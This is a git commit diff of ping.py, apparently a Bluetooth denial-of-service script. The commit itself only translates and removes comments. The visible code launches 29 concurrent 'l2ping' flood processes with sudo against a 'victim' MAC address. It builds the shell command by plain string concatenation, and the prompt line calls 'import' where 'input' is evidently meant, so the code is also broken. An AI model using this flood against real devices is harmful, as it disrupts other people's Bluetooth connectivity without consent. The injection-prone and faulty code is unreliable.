1eed7a361ede376129b06196695472603aac2382
Alexander <71342098+SamcraftSam@users.noreply.github.com>
2023-08-01 15:06:41 +0300

    Update ping.py

--- ping.py
+++ ping.py
@@ -5,9 +5,8 @@ from time import sleep
 victim = import("MAC: ")
 
 try:
-    # 30 - количество потоков. Не переусерствуейте.
+    # 30 - threads number
     for i in range(1, 30):
-        #Заменить мак адрес на свой
         xterm = "sudo l2ping -i hci0 -s 10 -f " + victim
         process = subprocess.Popen(xterm, stderr=subprocess.PIPE, shell=True)
         data = process.communicate()
